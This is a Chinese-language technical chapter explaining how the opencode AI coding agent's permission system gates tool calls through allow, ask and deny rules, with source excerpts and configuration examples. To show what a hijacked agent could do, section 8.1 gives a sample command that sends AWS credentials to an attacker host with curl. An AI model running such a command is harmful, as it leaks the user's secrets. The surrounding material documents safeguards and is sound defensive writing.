# 第 08 章：权限系统

> 代码版本：`anomalyco/opencode@d74d166a`（tag `v1.15.10`，2026-05-23）。
>
> 本章涉及目录：`packages/opencode/src/permission/`、`packages/opencode/src/config/permission.ts`、`packages/opencode/src/agent/`、`packages/opencode/src/server/routes/instance/httpapi/handlers/permission.ts`。

## 8.1 权限要解决的问题

把一个 AI 编码 Agent 接进开发流程，比安装一个 IDE 插件危险得多。插件能做的事情有限——读些文件、显示语法高亮、调起 LSP 而已；它的边界由 IDE 本身限定。一个 Agent 不一样：它能 spawn shell，能跑 `rm -rf node_modules`，能 `git push --force`，能 `curl https://attacker.com/exfil -d "$(cat ~/.aws/credentials)"`。一个被 prompt injection 攻陷的 Agent，或者一个走偏了的模型生成，可能瞬间造成不可恢复的损害。

opencode 的应对方式是：**所有副作用都必须显式请求权限**。工具自己不判断"能不能干"，而是声明"我要干什么"，由权限系统集中裁决，结果可能是：

- `allow` —— 直接执行；
- `ask` —— 弹给用户确认；
- `deny` —— 直接拒绝，把错误信息（带上"是哪条规则拒绝了你"）回灌给 LLM。

围绕这套机制，opencode 设计了若干配套：**规则 schema + 配置文件 + 三层粒度（工具/路径/命令前缀）+ 会话级 always 缓存 + bus 事件 + subagent 权限继承**。本章逐一拆开。

---

## 8.2 三个层级的权限粒度

理论上权限可以"按工具"做（这个工具能不能用），但这粒度太粗。也可以"按调用上下文"做（这个调用具体动什么），但需要给每个工具想一套独立模型。opencode 折中给出了三层：

<svg viewBox="0 0 760 440" xmlns="http://www.w3.org/2000/svg" class="figure-svg" role="img" aria-label="Three levels of permission granularity in opencode">
  <defs>
    <marker id="ar81" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#94a3b8"/>
    </marker>
  </defs>
  <rect x="40" y="14" width="680" height="100" rx="8" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="60" y="36" font-size="13" font-weight="700" fill="currentColor">层 1 ｜ 工具级</text>
  <text x="60" y="58" font-size="11" fill="currentColor">permission key 通常就是工具 id</text>
  <rect x="60" y="68" width="640" height="38" rx="4" fill="#fff" stroke="#cbd5e1"/>
  <text x="380" y="84" text-anchor="middle" font-size="11" fill="currentColor">bash ｜ edit ｜ read ｜ grep ｜ glob ｜ webfetch ｜ websearch ｜ task ｜ ...</text>
  <text x="380" y="99" text-anchor="middle" font-size="10" fill="#64748b">决定该工具的整体策略（allow/ask/deny）</text>
  <path d="M380,114 L380,138" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar81)"/>
  <text x="400" y="130" font-size="9.5" fill="#64748b">对每个工具，可进一步用 pattern 细分</text>
  <rect x="40" y="140" width="680" height="156" rx="8" fill="#99f6e4" stroke="#0d9488" stroke-width="1.5"/>
  <text x="60" y="162" font-size="13" font-weight="700" fill="currentColor">层 2 ｜ 参数 pattern</text>
  <text x="60" y="180" font-size="11" fill="currentColor">每次工具调用给出若干"pattern"串，按 wildcard 与规则匹配</text>
  <rect x="60" y="190" width="320" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="76" y="205" font-size="10.5" fill="currentColor">edit / write  →  相对 worktree 的文件路径</text>
  <rect x="60" y="214" width="320" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="76" y="229" font-size="10.5" fill="currentColor">read  →  相对 worktree 的文件路径</text>
  <rect x="60" y="238" width="320" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="76" y="253" font-size="10.5" fill="currentColor">bash  →  完整命令文本</text>
  <rect x="384" y="190" width="316" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="400" y="205" font-size="10.5" fill="currentColor">webfetch  →  URL</text>
  <rect x="384" y="214" width="316" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="400" y="229" font-size="10.5" fill="currentColor">grep  →  regex pattern</text>
  <rect x="384" y="238" width="316" height="22" rx="3" fill="#fff" stroke="#cbd5e1"/>
  <text x="400" y="253" font-size="10.5" fill="currentColor">task  →  subagent_type</text>
  <text x="60" y="284" font-size="10" fill="#64748b">wildcard 仅 `*` 与 `?`；末尾 " *" 特别处理使 "git push *" 也匹配纯 "git push"</text>
  <path d="M380,296 L380,322" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar81)"/>
  <text x="400" y="314" font-size="9.5" fill="#64748b">always 选择需要"宽于 patterns"的前缀</text>
  <rect x="40" y="324" width="680" height="100" rx="8" fill="#ddd6fe" stroke="#7c3aed" stroke-width="1.5"/>
  <text x="60" y="346" font-size="13" font-weight="700" fill="currentColor">层 3 ｜ 命令前缀（仅 bash 工具）</text>
  <text x="60" y="366" font-size="11" fill="currentColor">BashArity 表把 token 缩到人能理解的最小语义前缀</text>
  <rect x="60" y="376" width="640" height="40" rx="4" fill="#fff" stroke="#cbd5e1"/>
  <text x="76" y="392" font-size="10.5" fill="currentColor">"git status --porcelain" → always 模式 "git status *"</text>
  <text x="76" y="408" font-size="10.5" fill="currentColor">"npm run dev" → "npm run dev *" ｜ "docker compose up" → "docker compose *"</text>
</svg>
<span class="figure-caption">图 R8.1 ｜ 三层粒度：工具级决定"能不能"，pattern 级决定"动什么"，命令前缀级决定"以后是否再问"。</span>

<details>
<summary>ASCII 原版</summary>

```text
┌─────────────────────────────────────────────────────┐
│ 层 1：工具级                                          │
│   bash / edit / read / grep / glob / webfetch / ... │
│   permission key 通常就是工具 id                      │
└─────────────────────────────────────────────────────┘
              │
              ▼  对每个工具，可进一步用 pattern 细分
┌─────────────────────────────────────────────────────┐
│ 层 2：参数 pattern                                   │
│   每个工具调用时给出若干 "pattern" 串                 │
│   - edit / write:  相对 worktree 的文件路径           │
│   - read:          相对 worktree 的文件路径           │
│   - bash:          完整命令文本                        │
│   - webfetch:      URL                               │
│   - grep:          regex pattern                     │
│   - task:          subagent_type                     │
└─────────────────────────────────────────────────────┘
              │
              ▼  pattern 用 wildcard / glob 匹配规则
┌─────────────────────────────────────────────────────┐
│ 层 3：命令前缀 (仅 bash 工具)                         │
│   - "git status --porcelain" 触发的 always 模式      │
│     是 "git status *"，由 BashArity 表决定           │
│   - 让 "再问吗" 这件事粒度适中                          │
└─────────────────────────────────────────────────────┘
```

</details>

举两个例子让这三层落地：

**例 1**：模型要写 `packages/web/foo.tsx`。工具 `edit` 调用 `ctx.ask({ permission: "edit", patterns: ["packages/web/foo.tsx"], always: ["*"] })`（`tool/edit.ts:141-149`）。

- 层 1：用户的 `permission.edit` 规则集决定 edit 整体策略。
- 层 2：路径 `packages/web/foo.tsx` 匹配规则中的 `pattern`。
- 层 3：不涉及。

**例 2**：模型要跑 `git push origin main --force`。shell 工具调用 `ctx.ask({ permission: "bash", patterns: ["git push origin main --force"], always: ["git push *"] })`（`tool/shell.ts:281-287` + `shell.ts:404-405`）。

- 层 1：`permission.bash`。
- 层 2：完整命令文本与规则的 `pattern` 做 wildcard 比对。
- 层 3：当用户在 ask 对话框里选"以后都允许"，opencode 不会把整个 `git` 都允许了，而是写一条 `{ permission: "bash", pattern: "git push *", action: "allow" }`——`git push *` 来自 `BashArity.prefix(...)`（见第 07 章 7.7.4）。

---

## 8.3 规则 schema：Rule / Ruleset / Action

权限系统的数据基础放在 `packages/opencode/src/permission/index.ts` 和 `packages/core/src/permission.ts`。

### 8.3.1 三种 Action

`packages/core/src/permission.ts:6-7`：

```ts
export const Action = Schema.Literals(["allow", "deny", "ask"]).annotate({
  identifier: "PermissionV2.Action",
})
export type Action = typeof Action.Type
```

只有三种可能的裁决，没有"warn"、"log"、"trace" 这些花样。

### 8.3.2 Rule

一条 rule 由三个字段组成（`packages/core/src/permission.ts:9-13`）：

```ts
export const Rule = Schema.Struct({
  permission: Schema.String,
  pattern: Schema.String,
  action: Action,
})
```

- `permission`：通常就是工具名（`"bash"`、`"edit"`、`"read"`、…），可以用 wildcard（如 `"*"` 表示所有）。
- `pattern`：在层 2 用的匹配字符串，也支持 wildcard。
- `action`：`allow` / `deny` / `ask`。

`packages/opencode/src/permission/index.ts:22-27` 的 `Rule` 是同一形状（schema 重复声明只是为了在不同包之间各持一份 effect schema 元数据）。

### 8.3.3 Ruleset

一组 rule 就是 ruleset（`permission/index.ts:29`）：

```ts
export const Ruleset = Schema.Array(Rule)
export type Ruleset = Schema.Schema.Type<typeof Ruleset>
```

注意——是个**有序**数组。顺序在评估时有意义（见 8.4）。

### 8.3.4 Wildcard 实现

匹配函数在 `packages/core/src/util/wildcard.ts`：

```ts
export function match(input: string, pattern: string) {
  const normalized = input.replaceAll("\\", "/")
  let escaped = pattern
    .replaceAll("\\", "/")
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*")
    .replace(/\?/g, ".")

  if (escaped.endsWith(" .*")) escaped = escaped.slice(0, -3) + "( .*)?"

  return new RegExp("^" + escaped + "$", process.platform === "win32" ? "si" : "s").test(normalized)
}
```

要点：

- 只支持两种通配符：`*`（零或多个任意字符）和 `?`（一个任意字符）。**不是 glob**——`**` 也是 `.*`，没特别意义。
- 路径分隔符做归一化（`\` → `/`），Windows 大小写不敏感。
- 末尾 `" *"` 这个常用形状特别处理：`"git push *"` 会匹配 `"git push"`（无尾部 token）也匹配 `"git push origin main"`。这跟 `BashArity` 的设计严丝合缝。

---

## 8.4 Ruleset 评估：`Permission.evaluate`

匹配规则的核心实现在 `packages/core/src/permission.ts:21-31`：

```ts
export function evaluate(permission: string, pattern: string, ...rulesets: Ruleset[]): Rule {
  return (
    rulesets
      .flat()
      .findLast((rule) =>
        Wildcard.match(permission, rule.permission) && Wildcard.match(pattern, rule.pattern)
      ) ?? {
      action: "ask",
      permission,
      pattern: "*",
    }
  )
}
```

关键点：

1. **多个 ruleset 直接 flat**：评估时，agent 的 ruleset、session 的 ruleset、运行时 approved 列表会一起传进来按声明顺序串成一条长队。
2. **findLast**：**最后一条匹配的规则胜出**。这点和直觉相反——多数权限系统是"第一条匹配的胜出"。
3. **未命中默认 `ask`**：若没有任何规则匹配，returns `{ action: "ask", ... }`。

为什么 last-wins？因为配置文件通常这么写：

```json
{
  "permission": {
    "bash": {
      "*": "ask",
      "git *": "allow",
      "git push *": "deny"
    }
  }
}
```

读起来像"默认问，git 命令允许，但 push 拒绝"——后写的更具体，应该覆盖前面的笼统。`findLast` 让 JSON 里的字面顺序就是优先级顺序，**用户写的 JSON 读起来是什么意思，它就执行成什么意思**，无需操心特异度（CSS-style specificity）。

配置文件解析时甚至特意保留了原始字段顺序：`config/permission.ts:13-14` 的注释说：

> Runtime config parsing uses Effect's `propertyOrder: "original"` parse option so user key order is preserved for permission precedence.

如果换成传统 `Object.keys` 排序或字母序，这个机制就崩了。

`packages/opencode/src/permission/index.ts:138-140` 把它直接 re-export：

```ts
export function evaluate(permission: string, pattern: string, ...rulesets: Ruleset[]): Rule {
  return PermissionV2.evaluate(permission, pattern, ...rulesets)
}
```

---

## 8.5 `Permission.ask`：从工具到询问的全流程

工具调 `ctx.ask(req)`，最终走到 `Permission.Service.ask(input)`（`permission/index.ts:171-211`）：

```ts
const ask = Effect.fn("Permission.ask")(function* (input: AskInput) {
  const { approved, pending } = yield* InstanceState.get(state)
  const { ruleset, ...request } = input
  let needsAsk = false

  for (const pattern of request.patterns) {
    const rule = evaluate(request.permission, pattern, ruleset, approved)
    if (rule.action === "deny") {
      return yield* new DeniedError({ ruleset: ... })
    }
    if (rule.action === "allow") continue
    needsAsk = true
  }

  if (!needsAsk) return

  const id = request.id ?? PermissionID.ascending()
  const info: Request = { id, sessionID, permission, patterns, metadata, always, tool }
  const deferred = yield* Deferred.make<void, RejectedError | CorrectedError>()
  pending.set(id, { info, deferred })
  yield* bus.publish(Event.Asked, info)
  return yield* Effect.ensuring(
    Deferred.await(deferred),
    Effect.sync(() => pending.delete(id)),
  )
})
```

读这一段，要把 `request.patterns` 看成"我这次调用包含的所有 token"：

- bash 工具一次可能有多个 token：`scan.patterns` 来自 tree-sitter 拆出的子命令（`tool/shell.ts:404`）。
- 多数其它工具只有一个 token。

逐个 token 评估：

- 命中 deny → 立即抛 `DeniedError`，整个工具调用失败。
- 命中 allow → 这个 token 过了。
- 命中 ask（或未命中走默认） → 记下"需要问"。

如果所有 token 都 allow，函数直接 return（一气呵成的快路径）。如果至少一个需要 ask：

1. 生成一个 `PermissionID`（ULID 风格，时间排序）。
2. 构造 `Request` 对象，含 sessionID、patterns、always、metadata、tool（messageID + callID）。
3. 创建一个 `Deferred`，挂到 `pending` Map 里。
4. 通过 bus 发 `Permission.Event.Asked` 事件。
5. `await` 这个 deferred —— 工具调用在这里挂起，直到用户回应。

注意 `Effect.ensuring`：无论怎么退出（成功/失败/中断），都要把 `pending` 里这一项删掉，避免泄漏。

整个 ask 流程的状态机：

<svg viewBox="0 0 760 540" xmlns="http://www.w3.org/2000/svg" class="figure-svg" role="img" aria-label="Permission ask state machine with deny allow ask three branches and once always reject responses">
  <defs>
    <marker id="ar82" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#94a3b8"/>
    </marker>
  </defs>
  <rect x="200" y="14" width="360" height="36" rx="6" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="380" y="36" text-anchor="middle" font-size="12" font-weight="700" fill="currentColor">工具 ctx.ask({ permission, patterns, always })</text>
  <path d="M380,50 L380,72" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <rect x="220" y="74" width="320" height="36" rx="6" fill="#fff" stroke="#94a3b8" stroke-width="1.2"/>
  <text x="380" y="92" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">Permission.ask(ruleset, ...)</text>
  <text x="380" y="105" text-anchor="middle" font-size="10" fill="#64748b">逐 token evaluate</text>
  <path d="M180,120 L180,138" stroke="#dc2626" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M380,110 L380,138" stroke="#0d9488" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M580,120 L580,138" stroke="#0ea5e9" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M380,86 L180,120" stroke="#94a3b8" stroke-width="1" stroke-dasharray="3,2" fill="none"/>
  <path d="M380,86 L580,120" stroke="#94a3b8" stroke-width="1" stroke-dasharray="3,2" fill="none"/>
  <rect x="60" y="140" width="240" height="56" rx="6" fill="#fff" stroke="#dc2626" stroke-width="1.5"/>
  <text x="180" y="160" text-anchor="middle" font-size="11" font-weight="600" fill="currentColor">deny</text>
  <text x="180" y="177" text-anchor="middle" font-size="10" fill="currentColor">throw DeniedError</text>
  <text x="180" y="191" text-anchor="middle" font-size="10" fill="#64748b">→ 回灌给 LLM</text>
  <rect x="306" y="140" width="148" height="56" rx="6" fill="#fff" stroke="#0d9488" stroke-width="1.5"/>
  <text x="380" y="160" text-anchor="middle" font-size="11" font-weight="600" fill="currentColor">all allow</text>
  <text x="380" y="177" text-anchor="middle" font-size="10" fill="currentColor">return ()</text>
  <text x="380" y="191" text-anchor="middle" font-size="10" fill="#64748b">工具继续</text>
  <rect x="460" y="140" width="240" height="56" rx="6" fill="#fff" stroke="#0ea5e9" stroke-width="1.5"/>
  <text x="580" y="160" text-anchor="middle" font-size="11" font-weight="600" fill="currentColor">≥ 1 ask</text>
  <text x="580" y="177" text-anchor="middle" font-size="10" fill="currentColor">pending.set(id, { info, deferred })</text>
  <text x="580" y="191" text-anchor="middle" font-size="10" fill="#64748b">bus.publish(Event.Asked)</text>
  <path d="M580,196 L580,222" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <rect x="220" y="224" width="320" height="32" rx="6" fill="#ddd6fe" stroke="#7c3aed" stroke-width="1.5"/>
  <text x="380" y="244" text-anchor="middle" font-size="11" fill="currentColor">await deferred  ｜  TUI/CLI/Desktop/Web 弹出选择</text>
  <path d="M460,240 L540,224" stroke="#0ea5e9" stroke-width="1" stroke-dasharray="3,2" fill="none"/>
  <path d="M380,256 L160,294" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M380,256 L380,294" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M380,256 L600,294" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <rect x="40" y="296" width="240" height="104" rx="6" fill="#99f6e4" stroke="#0d9488" stroke-width="1.5"/>
  <text x="160" y="316" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">once</text>
  <text x="160" y="336" text-anchor="middle" font-size="10.5" fill="currentColor">Deferred.succeed(undefined)</text>
  <text x="160" y="354" text-anchor="middle" font-size="10" fill="#64748b">只放行这一次</text>
  <text x="160" y="378" text-anchor="middle" font-size="10" fill="#64748b">下次同样请求仍要再问</text>
  <rect x="284" y="296" width="240" height="104" rx="6" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="404" y="316" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">always</text>
  <text x="404" y="336" text-anchor="middle" font-size="10.5" fill="currentColor">approved.push(info.always)</text>
  <text x="404" y="354" text-anchor="middle" font-size="10" fill="currentColor">同 session 其它 pending</text>
  <text x="404" y="370" text-anchor="middle" font-size="10" fill="currentColor">若全部 allow → 一并 resolve</text>
  <text x="404" y="390" text-anchor="middle" font-size="10" fill="#64748b">本进程内生效</text>
  <rect x="528" y="296" width="232" height="104" rx="6" fill="#fff" stroke="#dc2626" stroke-width="1.5"/>
  <text x="644" y="316" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">reject (with msg?)</text>
  <text x="644" y="336" text-anchor="middle" font-size="10.5" fill="currentColor">Deferred.fail(RejectedError</text>
  <text x="644" y="350" text-anchor="middle" font-size="10.5" fill="currentColor">| CorrectedError)</text>
  <text x="644" y="370" text-anchor="middle" font-size="10" fill="#64748b">同 session 其它 pending</text>
  <text x="644" y="386" text-anchor="middle" font-size="10" fill="#64748b">一并 reject</text>
  <path d="M160,400 L380,470" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M404,400 L380,470" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <path d="M644,400 L380,470" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar82)"/>
  <rect x="220" y="478" width="320" height="38" rx="6" fill="#fff" stroke="#94a3b8" stroke-width="1.2"/>
  <text x="380" y="502" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">工具继续 ｜ 或 抛错给 LLM</text>
</svg>
<span class="figure-caption">图 R8.2 ｜ Permission.ask 的三路裁决（deny/allow/ask）与用户三种回应（once/always/reject）；always 与 reject 都会同 session 链式作用于其它 pending 请求。</span>

<details>
<summary>ASCII 原版</summary>

```text
工具 ctx.ask({ permission, patterns, always, metadata })
        │
        ▼
Permission.ask(ruleset, ...)
        │
        ├──→ deny           → throw DeniedError (回灌给 LLM)
        ├──→ all allow      → return ()        (工具继续)
        └──→ at least 1 ask
                │
                ▼
        pending.set(id, { info, deferred })
                │
                ▼
        bus.publish(Event.Asked, info)
                │   ↑↑↑ TUI / CLI / desktop / web 都订阅了这个事件
                │
                ▼
        await deferred
                │
                │       用户在前端选择...
                │
        ┌───────┴─────────────────────────────┐
        │                                     │
        ▼ once                                ▼ always                                 ▼ reject (with msg?)
   resolve(undefined)               approved.push(...) for each pattern         fail(RejectedError | CorrectedError)
        │                            resolve(undefined)                          │
        │                            把 pending 里其它"同 session 且现在都已被
        │                            approved"的请求一并 resolve                  │
        │                                     │                                  │
        └─────────────────────────────────────┴──────────────────────────────────┘
                                              │
                                              ▼
                                  工具继续 / 抛错给 LLM
```

</details>

---

## 8.6 用户回应：`Permission.reply`

`permission/index.ts:213-269` 处理用户回应：

```ts
const reply = Effect.fn("Permission.reply")(function* (input: ReplyInput) {
  const { approved, pending } = yield* InstanceState.get(state)
  const existing = pending.get(input.requestID)
  if (!existing) return yield* new NotFoundError({ requestID: input.requestID })

  pending.delete(input.requestID)
  yield* bus.publish(Event.Replied, {
    sessionID: existing.info.sessionID,
    requestID: existing.info.id,
    reply: input.reply,
  })

  if (input.reply === "reject") {
    yield* Deferred.fail(
      existing.deferred,
      input.message ? new CorrectedError({ feedback: input.message }) : new RejectedError(),
    )

    for (const [id, item] of pending.entries()) {
      if (item.info.sessionID !== existing.info.sessionID) continue
      pending.delete(id)
      yield* bus.publish(Event.Replied, { ..., reply: "reject" })
      yield* Deferred.fail(item.deferred, new RejectedError())
    }
    return
  }

  yield* Deferred.succeed(existing.deferred, undefined)
  if (input.reply === "once") return

  for (const pattern of existing.info.always) {
    approved.push({ permission: existing.info.permission, pattern, action: "allow" })
  }

  for (const [id, item] of pending.entries()) {
    if (item.info.sessionID !== existing.info.sessionID) continue
    const ok = item.info.patterns.every(
      (pattern) => evaluate(item.info.permission, pattern, approved).action === "allow",
    )
    if (!ok) continue
    pending.delete(id)
    yield* bus.publish(Event.Replied, { ..., reply: "always" })
    yield* Deferred.succeed(item.deferred, undefined)
  }
})
```

有四种回应分支需要分别理解：

### 8.6.1 `once`

只放行这一次。`Deferred.succeed`，工具继续。下次同样的请求还会被问。

### 8.6.2 `always`

放行这一次 + 把 `info.always` 里的每个 pattern 写入 `approved`（一个内存里的 ruleset 缓存）。然后**扫描所有 pending 请求**：如果某个 pending 请求的所有 patterns 现在都能在 approved 里命中 allow，那它也一并放行——避免"用户刚答应了 git status，紧接着模型又发起一个 git status 询问"的尴尬。

注意 `info.always` 是工具自己提供的（不是用户输入的），且通常宽于 `info.patterns`：

- bash：`patterns=["git status --porcelain"]`，`always=["git status *"]`。
- edit：`patterns=["packages/web/foo.tsx"]`，`always=["*"]`——用户答应"以后都允许 edit"就是放行所有 edit。

### 8.6.3 `reject`

`Deferred.fail` 一个 `RejectedError`，工具抛错，错误信息回灌给 LLM。**此外，会把同一 session 里所有其它 pending 请求也一并 reject**——这条逻辑很重要：

为什么连带拒绝？想象模型一口气发起了 5 个 tool_call，其中有一个是 `git push --force`，用户在弹窗里点了拒绝。如果别的 4 个还吊着，用户得再点 4 次"也拒绝"。让 reject 链式生效，是个体贴用户的设计。

### 8.6.4 `reject` 带 message（`CorrectedError`）

`permission/index.ts:87-93`：

```ts
export class CorrectedError extends Schema.TaggedErrorClass<CorrectedError>()(
  "PermissionCorrectedError",
  { feedback: Schema.String },
) {
  override get message() {
    return `The user rejected permission to use this specific tool call with the following feedback: ${this.feedback}`
  }
}
```

这是 opencode 的一个独特细节：拒绝时用户可以**带一段反馈文本**。这段文本会以 "用户的反馈" 形式注入到 LLM 看到的错误里，引导它改变方向——比 simply rejection 高效得多。

---

## 8.7 持久化 always：内存 + SQLite

`Permission.Service.layer` 内部状态（`permission/index.ts:133-136`）：

```ts
interface State {
  pending: Map<PermissionID, PendingEntry>
  approved: Rule[]
}
```

`approved` 一头连内存，一头连 SQLite。

### 8.7.1 启动时加载

`permission/index.ts:148-168`：

```ts
const state = yield* InstanceState.make<State>(
  Effect.fn("Permission.state")(function* (ctx) {
    const row = Database.use((db) =>
      db.select().from(PermissionTable)
        .where(eq(PermissionTable.project_id, ctx.project.id))
        .get(),
    )
    const state = {
      pending: new Map<PermissionID, PendingEntry>(),
      approved: [...(row?.data ?? [])],
    }
    yield* Effect.addFinalizer(() => Effect.gen(function* () {
      for (const item of state.pending.values()) {
        yield* Deferred.fail(item.deferred, new RejectedError())
      }
      state.pending.clear()
    }))
    return state
  }),
)
```

`PermissionTable`（`session/session.sql.ts:131-137`）：

```ts
export const PermissionTable = sqliteTable("permission", {
  project_id: text().primaryKey().references(() => ProjectTable.id, { onDelete: "cascade" }),
  ...Timestamps,
  data: text({ mode: "json" }).notNull().$type<Permission.Ruleset>(),
})
```

每个 project 一条记录，`data` 是 JSON 编码的 ruleset。启动时把它读进内存的 `approved` 数组。

### 8.7.2 关闭/重启行为

注意 `addFinalizer` 里——当 Permission.Service 被销毁（典型场景：opencode 进程退出），所有 pending 请求被 fail。也就是说：**用户回应过的 always 会持久化跨进程，但"正在问"的请求不会**——你关掉 opencode 再开，没回答的 ask 就丢了。

读完 `permission/index.ts` 全文，并**没有看到**把 `approved` 写回 `PermissionTable` 的代码——也就是说当前版本的 `always` 实际是**进程级**而非项目级持久化。`PermissionTable` 存在更像是为将来的"persistent always"做的接口预留：schema 已经定了，写入路径待补。这一行为也与官方文档一致（`web/src/content/docs/permissions.mdx:171-179`）：

> `always` — approve future requests matching the suggested patterns (**for the rest of the current OpenCode session**).

所以使用上：always = "本次会话不再问"，而不是"今后这个项目永远不问"。要永久允许，得改 `opencode.json`。

---

## 8.8 配置文件：用户视角的 ruleset

用户写在 `opencode.json` 里的 `permission` 字段长这样：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "permission": {
    "bash": {
      "*": "ask",
      "git *": "allow",
      "git commit *": "deny",
      "git push *": "deny",
      "grep *": "allow"
    },
    "edit": {
      "*": "deny",
      "packages/web/src/content/docs/*.mdx": "allow"
    },
    "external_directory": {
      "~/projects/personal/**": "allow"
    },
    "webfetch": "ask"
  }
}
```

格式由 `config/permission.ts` 定义。简要解读：

### 8.8.1 顶层结构

`config/permission.ts:16-37` 的 `InputObject` 列出已知的 permission key：

```ts
const InputObject = Schema.StructWithRest(
  Schema.Struct({
    read: Schema.optional(Rule),
    edit: Schema.optional(Rule),
    glob: Schema.optional(Rule),
    grep: Schema.optional(Rule),
    list: Schema.optional(Rule),
    bash: Schema.optional(Rule),
    task: Schema.optional(Rule),
    external_directory: Schema.optional(Rule),
    todowrite: Schema.optional(Action),
    question: Schema.optional(Action),
    webfetch: Schema.optional(Rule),
    websearch: Schema.optional(Rule),
    repo_clone: Schema.optional(Rule),
    repo_overview: Schema.optional(Rule),
    lsp: Schema.optional(Rule),
    doom_loop: Schema.optional(Action),
    skill: Schema.optional(Rule),
  }),
  [Schema.Record(Schema.String, Rule)],
)
```

注意几点：

- `Rule` 在这里被定义为 `Action | Object`（`permission.ts:10`），即可以是字符串（shorthand）也可以是对象。
- `todowrite` / `question` / `doom_loop` 不支持 pattern（只有 Action）——因为它们没有有意义的"被影响对象"。
- `StructWithRest` 允许任意额外键（给插件 / MCP 工具用）。

### 8.8.2 shorthand 展开

`config/permission.ts:43-46`：

```ts
const InputSchema = Schema.Union([Action, InputObject])

const normalizeInput = (input) => typeof input === "string" ? { "*": input } : input
```

即用户可以写：

```json
{ "permission": "allow" }  // 全部 allow
```

也可以写：

```json
{ "permission": { "*": "ask", "read": "allow" } }
```

也可以更具体：

```json
{ "permission": { "bash": { "*": "ask", "ls *": "allow" } } }
```

这些都被规范化到 `{ permission: { "<key>": { "<pattern>": <action> } } }` 形状。

### 8.8.3 转换成 Ruleset：`fromConfig`

`permission/index.ts:288-300`：

```ts
export function fromConfig(permission: ConfigPermission.Info) {
  const ruleset: Rule[] = []
  for (const [key, value] of Object.entries(permission)) {
    if (typeof value === "string") {
      ruleset.push({ permission: key, action: value, pattern: "*" })
      continue
    }
    ruleset.push(
      ...Object.entries(value).map(([pattern, action]) => ({
        permission: key,
        pattern: expand(pattern),
        action,
      })),
    )
  }
  return ruleset
}
```

外层和内层都是 `Object.entries`，依靠 JS 对象迭代顺序保留 = JSON 原始顺序（前提是上面提到的 `propertyOrder: "original"` 解析选项）。`expand(pattern)`（`permission/index.ts:280-286`）处理 `~/` 和 `$HOME/`：

```ts
function expand(pattern: string): string {
  if (pattern.startsWith("~/")) return os.homedir() + pattern.slice(1)
  if (pattern === "~") return os.homedir()
  if (pattern.startsWith("$HOME/")) return os.homedir() + pattern.slice(5)
  if (pattern.startsWith("$HOME")) return os.homedir() + pattern.slice(5)
  return pattern
}
```

主要是给 `external_directory` 用——`~/projects/personal/**` 这种家目录引用。

---

## 8.9 Agent 与 Session：ruleset 的实际来源

之前一直说"评估时把若干 ruleset 串成一条长队"，那"若干"具体是哪几个？

答案在 `session/tools.ts:64-72`：

```ts
ask: (req) =>
  permission
    .ask({
      ...req,
      sessionID: input.session.id,
      tool: { messageID: input.processor.message.id, callID: options.toolCallId },
      ruleset: Permission.merge(input.agent.permission, input.session.permission ?? []),
    })
    .pipe(Effect.orDie),
```

调用 `Permission.ask` 时，`ruleset` 字段是 `agent.permission` 和 `session.permission` 合并而成；评估时还会和 `approved`（内存里的 always 缓存）再并联。

```text
            ┌───────────────────────────┐
            │ Agent.Info.permission      │  ← 从配置/默认拼出的"这个 agent 的策略"
            └───────────────────────────┘
                          ┃
                          ▼ Permission.merge
            ┌───────────────────────────┐
            │ Session.permission         │  ← subagent session 启动时注入的额外规则
            └───────────────────────────┘
                          ┃
                          ▼ (作为 ruleset 传进 ask)
            ┌───────────────────────────┐
            │ runtime approved           │  ← 用户本次会话里答过 always 的规则
            └───────────────────────────┘
                          ┃
                          ▼
                    evaluate(permission, pattern, ruleset, approved)
```

### 8.9.1 Agent 的 ruleset 怎么来

`agent/agent.ts:106-281` 给出所有内置 agent 的默认权限。要点提炼：

**defaults**（`agent.ts:106-125`，所有 agent 的基线）：

```ts
const defaults = Permission.fromConfig({
  "*": "allow",
  doom_loop: "ask",
  external_directory: { "*": "ask", ...whitelistedDirs allowed... },
  question: "deny",
  plan_enter: "deny",
  plan_exit: "deny",
  repo_clone: "deny",
  repo_overview: "deny",
  read: {
    "*": "allow",
    "*.env": "ask",
    "*.env.*": "ask",
    "*.env.example": "allow",
  },
})
```

注意 `.env` 文件读默认 ask——这是一条很合理的默认安全策略，避免模型不小心把 secrets 读出来再 fetch 到外网。

**build agent**（`agent.ts:130-144`，默认主交互 agent）：

```ts
build: {
  permission: Permission.merge(
    defaults,
    Permission.fromConfig({ question: "allow", plan_enter: "allow" }),
    user,  // ← 用户在 opencode.json 里写的内容
  ),
